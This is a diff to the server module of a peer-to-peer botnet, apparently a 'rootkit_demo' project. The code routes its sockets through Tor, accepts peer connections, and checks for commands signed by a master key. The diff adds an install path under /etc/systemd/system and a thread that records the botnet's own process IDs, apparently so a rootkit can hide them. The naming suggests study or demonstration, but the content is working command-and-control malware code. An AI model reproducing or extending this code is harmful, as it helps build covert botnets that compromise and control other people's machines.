@@ -1,12 +1,13 @@
 """Server side of the p2p communication protocol"""
 
 import os
-import subprocess
+import time
+import copy
+import socks
+import socket
 import logging
 import threading
-import copy
-import socket
-import socks
+import subprocess
 
 from botnet_p2p import BUFFER_SIZE
 from botnet_p2p.operations import (
@@ -16,7 +17,7 @@ from botnet_p2p.operations import (
 )
 from botnet_p2p.message import breakdown_msg, signed_by_master
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.DEBUG)
 
 
 NEW_NODE = 0
@@ -29,17 +30,22 @@ TOR_SERVER_PORT = 50001
 DOWN_SERVER_PORT = 40000
 MAX_QUEUE = 4
 
-public_folder = "/etc/rootkit_demo/public/"
-public_peer_list = "/etc/rootkit_demo/public/peer_list"
-private_peer_list = "/etc/rootkit_demo/private/full_peer_list"
-public_key_path = "/etc/rootkit_demo/public/source/public_key"
+base_folder = "/etc/systemd/system/rootkit_demo"
+public_folder = os.path.join(base_folder, "public")
+public_peer_list = os.path.join(public_folder, "peer_list")
+private_peer_list = os.path.join(base_folder, "private/full_peer_list")
+public_key_path = os.path.join(public_folder, "source/public_key")
+process_path = os.path.join(base_folder, "process")
 
 
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
 socket.socket = socks.socksocket
 
 
-def start_server():
+def setup_server():
+    logging.info("Copying pids to process file ...")
+    process_thread = threading.Thread(target=write_pids_to_process_file, args=())
+    process_thread.start()
     logging.info("Starting communication server ...")
     server_socket = socket.socket()
     server_socket.bind((SERVER_HOST, SERVER_PORT))
@@ -49,7 +55,21 @@ def start_server():
         client_socket, addr = server_socket.accept()
         client_thread = threading.Thread(target=talk_with_client, args=(client_socket,))
         client_thread.start()
-        
+
+
+def write_pids_to_process_file():
+    with open(process_path, "w") as process_file:
+        process_file.write(f"{os.getpid()}\n")
+    len_file = 0
+    while len_file < 2:
+        os.system(
+            "ps aux | grep \"http.server 40000\" | grep -v grep | awk {'print $2'} >> "
+            + process_path
+        )
+        time.sleep(5)
+        with open(process_path, "r") as process_file:
+            len_file = len(process_file.readlines())
+
 
 def talk_with_client(client_socket: socket.socket) -> None:
     """ Keep the connection alive with the client and exchange
@@ -86,4 +106,4 @@ def msg_requires_to_be_signed(msg_type: int) -> bool:
     return msg_type != NEW_NODE
 
 
-start_server()
+setup_server()
